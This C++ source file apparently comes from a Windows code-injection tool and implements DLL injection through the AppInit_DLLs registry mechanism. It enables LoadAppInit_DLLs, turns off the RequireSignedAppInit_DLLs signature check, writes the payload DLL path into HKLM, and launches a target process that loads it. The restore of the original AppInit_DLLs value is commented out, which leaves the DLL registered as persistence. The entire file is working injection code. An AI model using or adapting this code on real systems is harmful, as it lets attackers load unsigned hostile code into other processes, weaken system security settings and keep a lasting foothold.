#include "../common.h"
#include "inj_appinit_dll_injection.h"


bool InjectorAppInitDLL::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	NTSTATUS err = ERROR_SUCCESS;
	DWORD fileSize = 0;
	blackbone::pe::PEImage targetModule;
	blackbone::pe::PEImage sourceModule;
	blackbone::Process targetProc;

	const HKEY rootKey = HKEY_LOCAL_MACHINE;
	const std::wstring subKey = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	const std::wstring appInitSubValue = L"AppInit_DLLs";
	const std::wstring loadAppInitSubValue = L"LoadAppInit_DLLs";
	const std::wstring requiredSignedAppInitSubValue = L"RequireSignedAppInit_DLLs";	
	bool readyToSetAppInitDLL = false;
	std::wstring oldAppInitDLLValue;
	DWORD oldLoadAppInitSubValue = 0;
	DWORD oldRequiredSignedAppInitSubValue = 0;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;
	std::wcout << L"[+] Attaching to target process and parsing source payload" << std::endl;

	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetModule))
	{
		std::wcout << L"[+] Checking for valid injection context" << std::endl;
		if (InjectorHelpers::IsValidInjectionTarget(sourceModule, targetModule))
		{		
			std::wcout << L"[+] Ensuring AppInitDLL function is enabled " << std::endl;
	
			//Checking first LoadAppInit_DLLs value
			DWORD defaultValue = 0;
			if (InjectorHelpers::GetRegDWORDValue(HKEY_LOCAL_MACHINE, subKey, loadAppInitSubValue, oldLoadAppInitSubValue, defaultValue))
			{
				if (oldLoadAppInitSubValue)
				{
					readyToSetAppInitDLL = true;
				}
				else if ((oldLoadAppInitSubValue == 0) && (InjectorHelpers::SetRegDWORDValue(HKEY_LOCAL_MACHINE, subKey, loadAppInitSubValue, 1)))
				{
					readyToSetAppInitDLL = true;
				}
				else
				{
					std::wcout << L"[-] there was a problem setting AppInitDLL function to enabled " << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] there was a problem ensuring AppInitDLL function is enabled " << std::endl;
			}

			//Then checking RequireSignedAppInit_DLLs value
			if (InjectorHelpers::GetRegDWORDValue(HKEY_LOCAL_MACHINE, subKey, requiredSignedAppInitSubValue, oldRequiredSignedAppInitSubValue, defaultValue))
			{
				InjectorHelpers::SetRegDWORDValue(HKEY_LOCAL_MACHINE, subKey, requiredSignedAppInitSubValue, 0);
			}

			std::wcout << L"[+] Checking AppInit_DLLs current content" << std::endl;
			if ((readyToSetAppInitDLL) && (InjectorHelpers::GetRegStringValue(HKEY_LOCAL_MACHINE, subKey, appInitSubValue, oldAppInitDLLValue)))
			{
				std::wcout << L"[+] Current content of registry value " << appInitSubValue << L" at " << subKey << L" is: " << oldAppInitDLLValue << std::endl;

				std::wstring newAppInitDLLValue;
				newAppInitDLLValue.append(L" ");
				newAppInitDLLValue.append(codeToInject);

				if (InjectorHelpers::SetRegStringValue(HKEY_LOCAL_MACHINE, subKey, appInitSubValue, newAppInitDLLValue))
				{
					std::wcout << L"[+] Written  new content " << newAppInitDLLValue << L" to registry value " << appInitSubValue << L" at " << subKey << std::endl;

					std::wcout << L"[+] About to start new process: " << targetToInject << std::endl;
					if (targetProc.CreateAndAttach(targetToInject, true) == ERROR_SUCCESS)
					{
						std::wcout << L"[+] New process successfully started. Now resuming it" << std::endl;
						if (targetProc.Resume() == ERROR_SUCCESS)
						{
							//InjectorHelpers::SetRegStringValue(HKEY_LOCAL_MACHINE, subKey, appInitSubValue, oldAppInitDLLValue);
							InjectorHelpers::SetRegDWORDValue(HKEY_LOCAL_MACHINE, subKey, loadAppInitSubValue, oldLoadAppInitSubValue);
							InjectorHelpers::SetRegDWORDValue(HKEY_LOCAL_MACHINE, subKey, requiredSignedAppInitSubValue, oldRequiredSignedAppInitSubValue);

							std::wcout << L"[+] Success! Code injected via InjectorAppInitDLL method" << std::endl;		
							ret = true;
						}
						else
						{
							std::wcout << L"[-] There was a problem resuming new process: " << targetToInject << std::endl;
						}
					}
					else
					{
						std::wcout << L"[-] There was a problem starting new process: " << targetToInject << std::endl;
					}
				}
				else
				{
					std::wcout << L"[-] There was a problem writting " << appInitSubValue << L" registry value at " << subKey << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] There was a problem reading " << appInitSubValue << L" registry value at " << subKey << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem validating injection target" << std::endl;
		}
	}
	else
	{
		std::wcout << L"[-] There was a problem setting up injection context data " << std::endl;
	}

	return ret;
}